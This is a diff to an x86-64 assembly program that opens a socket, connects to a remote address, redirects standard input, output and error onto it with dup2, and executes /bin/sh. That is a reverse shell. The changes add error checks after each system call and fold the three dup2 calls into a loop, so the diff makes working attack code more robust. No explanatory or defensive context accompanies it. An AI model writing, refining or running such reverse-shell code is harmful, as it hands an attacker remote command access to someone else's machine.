@@ -17,7 +17,8 @@ _start:
         mov rsi, 1
         mov rdx, 0
         syscall 
-
+        test rax, rax
+        js exit_with_error
         mov r8, rax
 
         ;connect(socket, sockaddr, 16)
@@ -26,22 +27,21 @@ _start:
         mov rdx, 16
         mov rax, 42
         syscall
+        test rax, rax
+        js exit_with_error
 
+        xor rsi, rsi
+dup2_loop:
         ;dup2(client_fd, new_fd)
         mov rax, 33
         mov rdi, r8
-        mov rsi, 0
         syscall
-        
-        mov rax, 33
-        mov rdi, r8
-        mov rsi, 1
-        syscall
+        test rax, rax
+        js exit_with_error
 
-        mov rax, 33
-        mov rdi, r8
-        mov rsi, 2
-        syscall
+        inc rsi
+        cmp rsi, 3
+        jne dup2_loop
 
         ;execve("/bin/sh", 0, 0)
         mov rax, 59
@@ -49,7 +49,14 @@ _start:
         mov rsi, 0
         mov rdx, 0
         syscall
+        test rax, rax
+        js exit_with_error
 
         mov rax, 60
         xor rdi, rdi
         syscall
+exit_with_error:
+        mov rax, 60
+        mov rdi, 1
+        syscall
+
